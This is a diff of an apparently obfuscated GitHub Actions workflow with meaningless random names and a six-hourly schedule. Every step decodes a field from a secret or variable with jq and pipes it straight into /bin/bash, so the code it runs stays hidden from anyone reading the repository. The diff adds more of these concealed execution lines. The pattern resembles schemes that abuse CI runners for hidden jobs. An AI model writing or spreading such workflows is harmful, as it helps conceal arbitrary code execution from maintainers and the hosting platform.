@@ -1,23 +1,30 @@
 name: rendageng7890
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 2/6 * * *'
-jobs:  # 12136
+    - cron: '42 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: rendageng7890
         env:
-          ednby89: ${{ secrets.ednby89 }}
+          iuh31747: ${{ secrets.iuh31747 }}
         run: |
-          echo $ednby89 | jq -r .rkw95 | /bin/bash
-          echo $sla4302 | jq -r .etjkg14554 | /bin/bash
-          echo $akk79807 | jq -r .ehfid65701 | /bin/bash
-          echo $arorb43875 | jq -r .j76204 | /bin/bash
-          echo $za745 | jq -r .k47 | /bin/bash
-          echo $tnvaw027 | jq -r .cnbh35 | /bin/bash
-          echo $r68854 | jq -r .s5 | /bin/bash
+          echo $iuh31747 | jq -r .fgyo5 | /bin/bash
+          echo $vt4339 | jq -r .k564 | /bin/bash
+          echo $tugnw394 | jq -r .vhq70151 | /bin/bash
+          echo $b94 | jq -r .aiz1902 | /bin/bash
+          echo $km6651 | jq -r .lbena5575 | /bin/bash
+          echo $sgktx1 | jq -r .acbl23598 | /bin/bash
+          echo $v8 | jq -r .racb494 | /bin/bash
+          echo $omh0763 | jq -r .ssoge97 | /bin/bash
+          echo $vsaq5 | jq -r .f64935 | /bin/bash
+          echo $p61460 | jq -r .zihmz03 | /bin/bash
+          echo $dylf90687 | jq -r .slz252 | /bin/bash
+          echo $rxf56224 | jq -r .gpu76 | /bin/bash
+          echo $of5 | jq -r .ix6 | /bin/bash
+          echo $q186 | jq -r .ygbzz64 | /bin/bash
 
